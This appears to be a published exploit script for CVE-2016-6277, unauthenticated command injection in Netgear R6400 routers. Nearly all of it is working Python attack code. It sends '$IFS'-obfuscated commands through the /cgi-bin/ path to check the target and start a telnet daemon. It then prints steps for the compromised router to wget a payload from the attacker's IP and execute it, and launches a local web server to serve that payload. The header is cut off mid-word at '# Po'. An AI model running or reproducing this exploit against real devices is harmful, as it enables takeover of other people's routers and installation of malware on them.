# Exploit Title: Netgear R6400 - Remote Code Execution
# Date: 2019-12-14
# Exploit Author: Kevin Randall
# CVE: CVE-2016-6277
# Vendor Homepage: https://www.netgear.com/
# Category: Hardware
# Version: V1.0.7.2_1.1.93

# Po

#!/usr/bin/python

import os
import urllib2
import argparse
import sys

# Set colors
G  = '\033[32m' # green
T  = '\033[93m' # tan
R  = '\033[31m' # red

# Define variable arguments for the program
tgt_parser = argparse.ArgumentParser()

# Define variable arguments for the Exploit
tgt_parser.add_argument('-p', '--port', dest='port', action='store', required=True, help="THis flag will set the port to open telnet on")
tgt_parser.add_argument('-t', dest='tip', action='store', required=True, help='Provide the IP you wish to exploit')
tgt_parser.add_argument('-i', dest='ip', action='store', required=True, help="Provide your IP address for the wget command")
tgt_parser.add_argument('-f', '--file', dest='file', action='store', required=True, help='Specifiy the file to file to get')
tgt_parser.add_argument('-d', '--directory', dest='directory', action='store', required=True, help='Specify the full path holding the file to serve')

if len(sys.argv) < 6:
    tgt_parser.print_help(sys.stderr)
    sys.exit(1)

tgt = tgt_parser.parse_args()

IP_ADDR = tgt.tip
PROTOCOL = "http://"
DIRECTORY = "/cgi-bin/;"
CMD = "uname$IFS-a"
CMD2 = "telnetd$IFS-p$IFS'"+tgt.port+"'"
FULL_URL = PROTOCOL + IP_ADDR + DIRECTORY + CMD
FULL_URL2 = PROTOCOL + IP_ADDR + DIRECTORY + CMD2

req = urllib2.Request(url = FULL_URL)
response = urllib2.urlopen(req)
commandoutput = response.read()
spl_word =  "}"
formattedoutput = commandoutput
result = formattedoutput.rpartition(spl_word)[2]
if 'Linux' in result:
    print G+'[+] This router is vulnerable'
    print T+'{~~} Begining Exploitation'
    req = urllib2.Request(url = FULL_URL2)
    response = urllib2.urlopen(req)
    os.system('gnome-terminal -e "telnet {tgt.tip} {tgt.port}"'.format(tgt=tgt))
    print "On the router run"
    print R+" cd /tmp\n wget http://"+tgt.ip+":8080/"+tgt.file+"\n chmod +x "+tgt.file+"\n ./"+tgt.file
    os.system('gnome-terminal --working-directory={tgt.directory} -e "python -m SimpleHTTPServer 8080"'.format(tgt=tgt))
    print G+"Exploit complete"
else:
    print R+"This router is not vulnerable"
